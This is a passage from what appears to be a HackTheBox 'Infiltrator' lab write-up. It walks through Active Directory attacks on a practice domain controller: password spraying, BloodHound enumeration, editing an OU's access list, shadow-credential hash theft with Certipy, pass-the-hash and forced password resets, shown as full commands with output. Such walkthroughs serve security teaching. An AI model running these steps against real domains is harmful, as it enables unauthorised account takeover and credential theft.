class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 Administrator 2024-08-21 19:58:28 0 Built-in account for administering the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 Guest &lt;never&gt; 0 Built-in account for guest access to the computer/domain </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 krbtgt 2023-12-04 17:36:16 0 Key Distribution Center Service Account </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 D.anderson 2023-12-04 18:56:02 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 L.clark 2023-12-04 19:04:24 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 M.harris 2024-09-05 01:56:45 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 O.martinez 2024-02-25 15:41:03 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 A.walker 2023-12-05 22:06:28 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 K.turner 2024-02-25 15:40:35 0 MessengerApp@Pass! </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 E.rodriguez 2024-09-05 01:56:45 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 winrm_svc 2024-08-02 22:42:45 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 lan_managment 2024-08-02 22:42:46 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 12 local users: INFILTRATOR </span></code></pre></div></div> <p>K.turner looks like they have a password in the LDAP comment, but it doesn’t work on the domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> K.turner <span class="nt">-p</span> <span class="s1">'MessengerApp@Pass!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>I’ll use that later.</p> <h4 id="password-spray">Password Spray</h4> <p>I’ve got two passwords so far. I’ll check them against the updated user list:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> valid_usernames.txt <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\D.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\L.clark:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\M.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\O.martinez:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\A.walker:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\K.turner:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\E.rodriguez:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\winrm_svc:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\lan_managment:WAT?watismypass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\D.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\M.harris:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\O.martinez:MessengerApp@Pass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\A.walker:MessengerApp@Pass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\E.rodriguez:MessengerApp@Pass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\winrm_svc:MessengerApp@Pass! STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\lan_managment:MessengerApp@Pass! STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>Still only L.Clark is successful, but I’ll notice for both passwords that two users, D.Anderson and M.Harris, return <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> (marked by a purple <code class="language-plaintext highlighter-rouge">[-]</code>). This status can mean that the user <a href="https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/">is in the Protected Users Group</a>, which doesn’t allow NTLM authentication</p> <p>I’ll try again with <code class="language-plaintext highlighter-rouge">-k</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> valid_usernames.txt <span class="nt">-p</span> passwords <span class="nt">--continue-on-success</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\D.anderson:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\L.clark:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\M.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\O.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\A.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\K.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\E.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\winrm_svc:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\lan_managment:WAT?watismypass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\M.harris:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\O.martinez:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\A.walker:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\K.turner:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\E.rodriguez:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\winrm_svc:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\lan_managment:MessengerApp@Pass! KDC_ERR_PREAUTH_FAILED </span></code></pre></div></div> <p>D.Anderson uses the same password!</p> <h4 id="validate-password-1">Validate Password</h4> <p>The password works, but nothing new on SMB:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> d.anderson <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="nt">-k</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\d.anderson:WAT?watismypass! </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span></code></pre></div></div> <h3 id="bloodhound">BloodHound</h3> <h4 id="collection">Collection</h4> <p>As soon as I have creds, I’ll run <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to check out the permissions within the active directory environment:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodhound-python <span class="nt">-c</span> All <span class="nt">-d</span> infiltrator.htb <span class="nt">-u</span> l.clark <span class="nt">-p</span> <span class="s1">'WAT?watismypass!'</span> <span class="nt">-ns</span> 10.10.11.31 <span class="nt">--zip</span> <span class="go">INFO: Found AD domain: infiltrator.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.infiltrator.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.infiltrator.htb INFO: Found 14 users INFO: Found 58 groups INFO: Found 2 gpos INFO: Found 2 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc01.infiltrator.htb </span></code></pre></div></div> <h4 id="analysis">Analysis</h4> <p>On opening up the data in BloodHound, I’ll mark L.Clark as owned. They don’t have any interesting access.</p> <p>d.ansderson, on the other hand, shows one object with first degree object control:</p> <picture> <source type="image/webp" srcset="/img/image-20240905060700725.webp" /> <img loading="lazy" src="/img/image-20240905060700725.png" alt="image-20240905060700725" class="include_image " /> </picture> <p>That is <code class="language-plaintext highlighter-rouge">GenericAll</code> over the Marketing Digital OU:</p> <picture> <source type="image/webp" srcset="/img/image-20240905060840575.webp" /> <img loading="lazy" src="/img/image-20240905060840575.png" alt="image-20240905060840575" class="include_image " /> </picture> <p>Working down the chain of outbound control, I’ll find this graph:</p> <picture> <source type="image/webp" srcset="/img/image-20240905061058454.webp" /> <img loading="lazy" src="/img/image-20240905061058454.png" alt="image-20240905061058454" class="include_image " /> </picture> <h3 id="auth-as-erodriguez">Auth as E.Rodriguez</h3> <h4 id="background">Background</h4> <p>D.Anderson has <code class="language-plaintext highlighter-rouge">GenericAll</code> on the Marketing Digital organization unit (OU). An OU is a way to group and manage users (and computers and other objects) within active directory. It allows for admins to say that all users in this specific area should have these rights.</p> <p><a href="https://www.adamcouch.co.uk/dacl-trouble-genericall-on-ous/">DACL Trouble: GenericAll on OUs</a> from Adam Couch goes into how a penetration tester can abuse this privilege on an OU. The idea is to configure the OU such that all members of the OU get the <code class="language-plaintext highlighter-rouge">GenericAll</code> permission from a user that I control. Once I have <code class="language-plaintext highlighter-rouge">GenericAll</code> over a user, I can change their password or add a shadow credential.</p> <p>The <a href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll#h_01HM28BQ0587GFX2DM54GCQZ2M">BloodHound Support</a> documentation has a similar bit about abusing <code class="language-plaintext highlighter-rouge">GenericAll</code> on an OU.</p> <h4 id="htb-note">HTB Note</h4> <p>This entire path has a reset so that other players don’t get the benefit. I have to do all these commands very quickly in order to get it to work. I’ll walk through them with explanation, but the best way to manage it is with a pasteable script that runs all the commands together.</p> <h4 id="modify-ou">Modify OU</h4> <p>Both of the posts above show how to use PowerShell to change the OU discretionary access control list (DACL). I don’t have PowerShell access to Infiltrator yet. <a href="https://www.synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory">This post from SynActiv</a> shows how to do it with <code class="language-plaintext highlighter-rouge">dacledit.py</code> (from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>):</p> <picture> <source type="image/webp" srcset="/img/image-20240906092735187.webp" /> <img loading="lazy" src="/img/image-20240906092735187.png" alt="image-20240906092735187" class="include_image " /> </picture> <p>This is exactly what I want to do. If I try using password, it fails:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dacledit.py <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl <span class="nt">-inheritance</span> <span class="nt">-principal</span> d.anderson <span class="nt">-target-dn</span> <span class="s2">"OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB"</span> <span class="s1">'infiltrator.htb/d.anderson:WAT?watismypass!'</span> <span class="nt">-dc-ip</span> infiltrator.htb <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] unsupported hash type MD4 </span></code></pre></div></div> <p>That’s due to the limitations on the D.Anderson account. I’ll get a ticket with Kerberos:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getTGT.py <span class="s1">'infiltrator.htb/d.anderson:WAT?watismypass!'</span> <span class="nt">-dc-ip</span> infiltrator.htb <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in d.anderson.ccache </span></code></pre></div></div> <p>How I’ll run <code class="language-plaintext highlighter-rouge">dacledit.py</code> with <code class="language-plaintext highlighter-rouge">-k and -no-pass</code> with that ticket set as the <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>d.anderson.ccache dacledit.py <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl <span class="nt">-inheritance</span> <span class="nt">-principal</span> d.anderson <span class="nt">-target-dn</span> <span class="s2">"OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB"</span> infiltrator.htb/d.anderson <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> infiltrator.htb <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU [*] DACL backed up to dacledit-20240906-094213.bak [*] DACL modified successfully! </span></code></pre></div></div> <p>Alternatively, I can just add <code class="language-plaintext highlighter-rouge">-k</code> to the original command, and it will handle this in the background:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dacledit.py <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl <span class="nt">-inheritance</span> <span class="nt">-principal</span> d.anderson <span class="nt">-target-dn</span> <span class="s2">"OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB"</span> <span class="s1">'infiltrator.htb/d.anderson:WAT?watismypass!'</span> <span class="nt">-dc-ip</span> infiltrator.htb <span class="nt">-k</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping... [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU [*] DACL backed up to dacledit-20250610-212946.bak [*] DACL modified successfully! </span></code></pre></div></div> <p>Either way, now D.Anderson has <code class="language-plaintext highlighter-rouge">FullControl</code> over all the members of the OU, including E.Rodriguez.</p> <h4 id="shadow-credential">Shadow Credential</h4> <p>With <code class="language-plaintext highlighter-rouge">FullControl</code>, a lot of people would go to changing the password of e.rodriguez. I would much rather add a shadow credential to the account using <a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#shadow-credentials">Certipy</a> like I showed in <a href="/2023/05/27/htb-absolute.html#shadow-credential">Absolute</a>. This attack is not only stealthier, but also isn’t suceptable to HTB cleanup scripts.</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>d.anderson.ccache certipy shadow auto <span class="nt">-k</span> <span class="nt">-target</span> dc01.infiltrator.htb <span class="nt">-account</span> e.rodriguez <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Targeting user 'E.rodriguez' [*] Generating certificate [*] Certificate generated [*] Generating Key Credential [*] Key Credential generated with DeviceID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4' [*] Adding Key Credential with device ID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4' to the Key Credentials for 'E.rodriguez' [*] Successfully added Key Credential with device ID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4' to the Key Credentials for 'E.rodriguez' [*] Authenticating as 'E.rodriguez' with the certificate [*] Using principal: e.rodriguez@infiltrator.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'e.rodriguez.ccache' [*] Trying to retrieve NT hash for 'e.rodriguez' [*] Restoring the old Key Credentials for 'E.rodriguez' [*] Successfully restored the old Key Credentials for 'E.rodriguez' [*] NT hash for 'E.rodriguez': b02e97f2fdb5c3d36f77375383449e56 </span></code></pre></div></div> <p>This both leaks the NTLM for the account and saves a new TGT as <code class="language-plaintext highlighter-rouge">e.rodriguez.ccache</code>. I’ll use the ticket to authenticate with <code class="language-plaintext highlighter-rouge">netexec</code>, and it works!</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>e.rodriguez.ccache netexec smb infiltrator.htb <span class="nt">--use-kcache</span> <span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\e.rodriguez from ccache </span></code></pre></div></div> <p>The NTLM hash also leaks, and it works to auth as well:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc01.infiltrator.htb <span class="nt">-u</span> E.rodriguez <span class="nt">-H</span> b02e97f2fdb5c3d36f77375383449e56 <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\E.rodriguez:b02e97f2fdb5c3d36f77375383449e56 </span></code></pre></div></div> <p>I can use either the ticket or the NTLM hash to auth as E.rodriguez for the next steps.</p> <h3 id="auth-as-mharris">Auth as M.Harris</h3> <h4 id="add-erodriguez-to-chiefs-marketing-group">Add E.Rodriguez to CHIEFS MARKETING Group</h4> <p>I’ll use <a href="https://github.com/CravateRouge/bloodyAD">BloodyAD</a> to add E.Rodriguez to the Chiefs Marketing group, as they have <code class="language-plaintext highlighter-rouge">AddSelf</code> on the group:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodyAD <span class="nt">-u</span> e.rodriguez <span class="nt">-p</span> :b02e97f2fdb5c3d36f77375383449e56 <span class="nt">--host</span> dc01.infiltrator.htb <span class="nt">-d</span> infiltrator.htb add groupMember <span class="s2">"CHIEFS MARKETING"</span> e.rodriguez <span class="go">[+] e.rodriguez added to CHIEFS MARKETING </span></code></pre></div></div> <p>That same command over Kerberos auth looks like:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>e.rodriguez.ccache bloodyAD <span class="nt">-u</span> e.rodriguez <span class="nt">-k</span> <span class="nt">--host</span> dc01.infiltrator.htb <span class="nt">-d</span> infiltrator.htb add groupMember <span class="s2">"CHIEFS MARKETING"</span> e.rodriguez <span class="go">[+] e.rodriguez added to CHIEFS MARKETING </span></code></pre></div></div> <h4 id="change-mharris-password">Change M.Harris’ Password</h4> <p>Members of the Chiefs Marketing group have <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> over M.Harris. As E.Rodriguez is now a member of that group, I’ll change this with <code class="language-plaintext highlighter-rouge">bloodyAD</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodyAD <span class="nt">-u</span> e.rodriguez <span class="nt">-p</span> :b02e97f2fdb5c3d36f77375383449e56 <span class="nt">--host</span> dc01.infiltrator.htb <span class="nt">-d</span> infiltrator.htb <span class="nb">set </span>password m.harris <span class="s2">"0xdf0xdf!"</span> <span class="go">[+] Password changed successfully! </span></code></pre></div></div> <p>The creds for M.Harris have the same restrictions as D.Anderson:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> m.harris <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> infiltrator.htb\m.harris:0xdf0xdf! STATUS_ACCOUNT_RESTRICTION </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> m.harris <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\m.harris:0xdf0xdf! </span></code></pre></div></div> <p>Originally I used <code class="language-plaintext highlighter-rouge">changepasswd.py</code> (from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>). I believe this worked back when Infiltrator released, but today it gives:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb <span class="nt">-althash</span> :b02e97f2fdb5c3d36f77375383449e56 <span class="nt">-reset</span> <span class="nt">-dc-ip</span> dc01.infiltrator.htb <span class="nt">-newpass</span> <span class="s1">'0xdf0xdf!'</span> <span class="nt">-altuser</span> e.rodriguez <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Setting the password of infiltrator.htb\m.harris as infiltrator.htb\e.rodriguez [*] Connecting to DCE/RPC as infiltrator.htb\e.rodriguez [*] Password was changed successfully. [!] User no longer has valid AES keys for Kerberos, until they change their password again. </span></code></pre></div></div> <p>The password changes, but there’s a warning at the end that the AES keys for Kerberos are not correct. Using Kerberos will fail with <code class="language-plaintext highlighter-rouge">KDC_ERR_ETYPE_NOSUPP</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> m.harris <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> infiltrator.htb 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> 